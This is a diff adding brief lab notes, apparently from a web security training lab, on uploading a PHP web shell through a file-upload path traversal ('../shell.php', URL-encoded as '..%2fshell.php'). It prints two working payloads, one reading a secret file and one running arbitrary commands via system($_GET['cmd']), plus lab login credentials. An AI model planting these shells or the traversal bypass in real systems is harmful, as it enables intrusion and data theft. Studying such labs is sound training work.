@@ -1,0 +1,28 @@
+Web shell upload via path traversal
+Goal: Exploit file upload vulnerability to upload a PHP web shell and exfiltrate the contents of /home/carlos/secret
+wiener:peter
+
+1)
+-login
+-upload shell.php
+-visiting files/avatars/shell.php
+-> Only displays the contents of the shell and doesn't run it.
+
+2)
+-send upload to repeater
+-change filename="shell.php" to "../shell.php"
+-upload
+-> Ok
+
+3)
+-Visit /files/shell.php
+-> not found
+-url encode "..%2fshell.php"
+
+-Payload Option
+shell.php
+<?php echo file_get_contents('/home/carlos/secret');?>
+
+Payload Option
+shell.php
+<?php system($_GET['cmd']);?>
